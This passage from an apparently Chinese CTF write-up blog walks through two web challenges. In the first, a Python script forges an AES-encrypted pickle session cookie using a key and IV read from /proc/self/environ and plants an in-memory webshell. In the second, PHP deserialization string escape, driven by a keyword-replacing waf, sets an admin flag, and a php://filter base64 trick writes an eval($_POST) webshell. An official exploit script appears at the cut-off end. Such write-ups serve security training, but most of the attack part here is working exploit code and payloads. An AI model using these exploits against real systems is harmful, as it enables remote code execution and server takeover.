class="hljs-string">&quot;session&quot;</span>])<br>        <span class="hljs-keyword">if</span> session:<br>            data=<span class="hljs-string">&quot;&quot;</span><br>            filename=request.args.get(<span class="hljs-string">&quot;filename&quot;</span>)<br>            <span class="hljs-keyword">if</span>(filename):<br>                data=dowload_file(filename)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,name=session[<span class="hljs-string">&#x27;username&#x27;</span>],file_data=data)<br><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>        password = request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>        <span class="hljs-comment"># 验证凭据（实际应比较密码哈希）</span><br>        <span class="hljs-keyword">if</span> users.get(username) == password:<br>            resp = make_response(redirect(<span class="hljs-string">&quot;/&quot;</span>))<br>            <span class="hljs-comment"># 创建并设置会话Cookie</span><br>            resp.set_cookie(<span class="hljs-string">&quot;session&quot;</span>, create_session(username))<br>            <span class="hljs-keyword">return</span> resp<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>,error=<span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/logout&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    resp = make_response(redirect(<span class="hljs-string">&quot;/login&quot;</span>))<br>    resp.delete_cookie(<span class="hljs-string">&quot;session&quot;</span>)<br>    <span class="hljs-keyword">return</span> resp<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>通过源码可以发现其session是通过pickle  序列化字典然后base64编码再AES加密在编码的结果，验证用户时session解码的过程也是base64解码AES解码base64解码pickle反序列化。那么我们只要能够获得这个加解密的key和iv就可以伪造出session从而控制pickle反序列化的内容，进行命令执行。</p><p>而key和iv是从环境变量里读出来的。我们可以读取&#x2F;proc&#x2F;self&#x2F;environ来得到key和iv。（有点像做过的题了）</p><p>进而命令执行。因为无回显我们可以直接打内存马，或者弹shell或者写文件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503292207344.png" alt="image-20250327232731546"></p><p>使用如下exp打入内存马（内存马？以后专门写一写）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="hljs-keyword">import</span> Cipher, algorithms, modes<br><span class="hljs-keyword">from</span> cryptography.hazmat.backends <span class="hljs-keyword">import</span> default_backend<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives <span class="hljs-keyword">import</span> padding<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_encrypt_decrypt</span>(<span class="hljs-params">data, key, iv, mode=<span class="hljs-string">&#x27;encrypt&#x27;</span></span>):<br>    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())<br><br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-string">&#x27;encrypt&#x27;</span>:<br>        encryptor = cipher.encryptor()<br>        padder = padding.PKCS7(algorithms.AES.block_size).padder()<br>        padded_data = padder.update(data.encode()) + padder.finalize()<br>        result = encryptor.update(padded_data) + encryptor.finalize()<br>        <span class="hljs-keyword">return</span> base64.b64encode(result).decode()  <br><br>    <span class="hljs-keyword">elif</span> mode == <span class="hljs-string">&#x27;decrypt&#x27;</span>:<br>        decryptor = cipher.decryptor()<br>        encrypted_data_bytes = base64.b64decode(data)<br>        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()<br>        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()<br>        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()<br>        <span class="hljs-keyword">return</span> unpadded_data.decode()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;shell&#x27;)).read()&quot;</span>,))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">url</span>):<br>    a = A()<br>    pickled = pickle.dumps(a)<br>    <span class="hljs-built_in">print</span>(pickled)<br>    key = <span class="hljs-string">b&quot;ajwdopldwjdowpajdmslkmwjrfhgnbbv&quot;</span>  <br>    iv = <span class="hljs-string">b&quot;asdwdggiouewhgpw&quot;</span><br><br>    pickled_data = base64.b64encode(pickled).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>    payload=aes_encrypt_decrypt(pickled_data,key,iv,mode=<span class="hljs-string">&#x27;encrypt&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(payload)<br>    Cookie=&#123;<span class="hljs-string">&quot;session&quot;</span>:payload&#125;<br>    request = requests.post(url,cookies=Cookie)<br>    <span class="hljs-built_in">print</span>(request)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span class="hljs-string">&quot;http://node2.anna.nssctf.cn:28942/&quot;</span><br>    exp(url)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503292207614.png" alt="image-20250327233400941"></p><h1 id="Escape！"><a href="#Escape！" class="headerlink" title="Escape！"></a>Escape！</h1><p>给了源码</p><p>我们通过源码可以看到在dashboard.php中有一个文件写入的操作，我们只要绕过exit就可以进行命令执行</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$user=unserialize($userData)<span class="hljs-comment">;</span><br><span class="hljs-keyword">if</span>($user-&gt;<span class="hljs-built_in">isadmin</span>)&#123;<br>        $tmp=file_get_contents(<span class="hljs-string">&quot;tmp/admin.html&quot;</span>)<span class="hljs-comment">;</span><br><br>        echo $tmp<span class="hljs-comment">;</span><br><br>        <span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;txt&#x27;</span>]) &#123;<br>        $content = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span><span class="hljs-comment">;</span><br>$content .= $_POST[<span class="hljs-string">&#x27;txt&#x27;</span>]<span class="hljs-comment">;</span><br>file_put_contents($_POST[<span class="hljs-string">&#x27;filename&#x27;</span>], $content)<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里我们可以使用<code>php://filter/convert.base64-decode</code>来进行base64绕过</p><p>需要注意，这里是<code>$content .= $_POST[&#39;txt&#39;];</code>，我们写入的结果是<code>&lt;?php exit; ?&gt;</code>并上我们的<code>$_POST[&#39;txt&#39;]</code></p><p>我们的目的是用base64解密使<code>&lt;?php exit; ?&gt;</code>成为乱码但不影响我们的一句话木马，所以我们构造如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-decode/</span>resource=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><span class="hljs-number">1</span>.php&amp;txt=aPD9waHAgZXZhbCgkX1BPU1RbY21kXSk/Pg==<br></code></pre></td></tr></table></figure><p>我们在一句话木马之前加上一个字符a，来填充对齐，使得能正常解密我们的一句话木马</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503292235096.png" alt="image-20250329223542733"></p><p>但是这个文件写入操作需要用户为admin。我们看一下逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSignedCookie</span>(<span class="hljs-params"><span class="hljs-variable">$cookieName</span> = <span class="hljs-string">&#x27;user_token&#x27;</span>, <span class="hljs-variable">$secretKey</span> = <span class="hljs-string">&#x27;fake_secretkey&#x27;</span></span>) </span>&#123;<br>    <span class="hljs-comment">// 获取 Cookie 内容</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-variable">$cookieName</span>])) &#123;<br>        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-variable">$cookieName</span>];<br><br>        <span class="hljs-comment">// 解码并分割数据和签名</span><br>        <span class="hljs-variable">$decodedToken</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$token</span>);<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$serializedData</span>, <span class="hljs-variable">$providedSignature</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$decodedToken</span>);<br><br>        <span class="hljs-comment">// 重新计算签名</span><br>        <span class="hljs-variable">$calculatedSignature</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$serializedData</span>, <span class="hljs-variable">$secretKey</span>);<br><br>        <span class="hljs-comment">// 比较签名是否一致</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$calculatedSignature</span> === <span class="hljs-variable">$providedSignature</span>) &#123;<br>            <span class="hljs-comment">// 签名验证通过，返回序列化的数据</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$serializedData</span>;  <span class="hljs-comment">// 反序列化数据</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 签名验证失败</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 如果没有 Cookie</span><br>&#125;<br><br><span class="hljs-comment">// 示例：验证并读取 Cookie</span><br><span class="hljs-variable">$userData</span> = <span class="hljs-title function_ invoke__">checkSignedCookie</span>();<br></code></pre></td></tr></table></figure><p>可以知道首先是获得session然后解密，将解密内容进行反序列话，然后调用反序列化实例的isadmin方法。首先我们不知道密钥值是多少所以无法直接通过伪造sseion来伪造admin。</p><p>但是我们发现waf函数有替换，或许可以通过反序列化字符串逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$lists</span>=[<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;sleep&quot;</span>,<span class="hljs-string">&quot;and&quot;</span>,<span class="hljs-string">&quot;||&quot;</span>,<span class="hljs-string">&quot;&amp;&amp;&quot;</span>,<span class="hljs-string">&quot;select&quot;</span>,<span class="hljs-string">&quot;union&quot;</span>];<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$lists</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$list</span>)&#123;<br>        <span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$list</span>,<span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <span class="hljs-comment">#echo $c;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$c</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键点在于login.php中确实使用了waf函数，发现确实可行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$db</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>,[<span class="hljs-variable">$username</span>]);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$data</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;用户不存在&#x27;)&lt;/script&gt;&lt;script&gt;window.location.href = &#x27;index.html&#x27;&lt;/script&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;password&#x27;</span>]!==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;密码错误&#x27;)&lt;/script&gt;&lt;script&gt;window.location.href = &#x27;index.html&#x27;&lt;/script&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;username&#x27;</span>]===<span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-variable">$username</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-variable">$username</span>, <span class="hljs-literal">false</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$user</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setSignedCookie</span>(<span class="hljs-params"><span class="hljs-variable">$serializedData</span>, <span class="hljs-variable">$cookieName</span> = <span class="hljs-string">&#x27;user_token&#x27;</span>, <span class="hljs-variable">$secretKey</span> = <span class="hljs-string">&#x27;fake_secretKey&#x27;</span></span>) </span>&#123;<br>    <span class="hljs-variable">$signature</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$serializedData</span>, <span class="hljs-variable">$secretKey</span>);<br><br>    <span class="hljs-variable">$token</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$serializedData</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$signature</span>);<br><br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-variable">$cookieName</span>, <span class="hljs-variable">$token</span>, <span class="hljs-title function_ invoke__">time</span>() + <span class="hljs-number">3600</span>, <span class="hljs-string">&quot;/&quot;</span>);  <span class="hljs-comment">// 设置有效期为1小时</span><br>&#125;<br><br><span class="hljs-variable">$User</span>=<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$SQL</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$User_ser</span>=<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$User</span>));<br><br><span class="hljs-title function_ invoke__">setSignedCookie</span>(<span class="hljs-variable">$User_ser</span>);<br></code></pre></td></tr></table></figure><p>我们去class.php中找到User类，然后构造一个序列化字符串看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$isadmin</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$isadmin</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;isadmin=<span class="hljs-variable">$isadmin</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-variable">$user</span>= <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;matrix&quot;</span>,<span class="hljs-literal">true</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;matrix&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;isadmin&quot;</span>;b:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><p>然后我们修改用户名，进行字符串逃逸</p><p>这里我写了一个验证脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$lists</span>=[<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;sleep&quot;</span>,<span class="hljs-string">&quot;and&quot;</span>,<span class="hljs-string">&quot;||&quot;</span>,<span class="hljs-string">&quot;&amp;&amp;&quot;</span>,<span class="hljs-string">&quot;select&quot;</span>,<span class="hljs-string">&quot;union&quot;</span>];<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$lists</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$list</span>)&#123;<br>        <span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$list</span>,<span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <span class="hljs-comment">#echo $c;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$c</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$isadmin</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$isadmin</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;isadmin=<span class="hljs-variable">$isadmin</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-variable">$user</span>= <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;matrix&quot;</span>,<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">//echo serialize($user);</span><br><br><span class="hljs-comment">//$U = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:156:&quot;matrixselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselect&quot;;s:4:&quot;tony&quot;;s:27:&quot;matrix&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&quot;;&#125;&#x27;;</span><br><span class="hljs-variable">$U</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$User_ser</span>=<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$U</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$User_ser</span>;<br></code></pre></td></tr></table></figure><p>字符串增加逃逸</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">111</span>:<span class="hljs-string">&quot;matrixflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;isadmin&quot;</span>;b:<span class="hljs-number">1</span>;&#125;<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>然后我们只需将用户名输入即可</p><p>分别为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">matrixflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;isadmin&quot;</span>;<span class="hljs-selector-tag">b</span>:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><p>先注册，再登陆，然后写入shell</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503292335433.png" alt="image-20250329233550034"></p><p>写入，用蚁剑连接</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503292344316.png" alt="image-20250329234449178"></p><p>字符串减少逃逸</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">&quot;matrixselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselectselect&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;tony&quot;</span>;s:<span class="hljs-number">27</span>:<span class="hljs-string">&quot;matrix&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;isadmin&quot;</span>;b:<span class="hljs-number">1</span>;&#125;<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>但是实际上这里字符串减少逃逸是无效的</p><p>为什么？</p><p>因为字符串减少逃逸这里只能吞字符，但并不能写入isadmin，所以无法使isadmin的值为1</p><p>上面步骤挺麻烦，这里贴一个官方的脚本</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests<br>def <span class="hljs-built_in">exp</span>(url):<br>    <span class="hljs-keyword">data</span>=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:7:&quot;isadmin&quot;;b:1;&#125;&#x27;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span>&#125;<br>    r=requests.post(url+<span class="hljs-string">&quot;register.php&quot;</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)<br>    #print(r.<span class="hljs-keyword">text</span>)<br><br>    session = requests.Session()<br>    login_response = session.post(url+<span class="hljs-string">&quot;login.php&quot;</span>, <span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)<br><br>    shell=&#123;<span class="hljs-string">&quot;filename&quot;</span>:<span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=/var/www/html/shell.php&quot;</span>,<span class="hljs-string">&quot;txt&quot;</span>:<span class="hljs-string">&quot;aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==&quot;</span>&#125;<br>    protected_response = session.post(url+<span class="hljs-string">&quot;dashboard.php&quot;</span>,<span 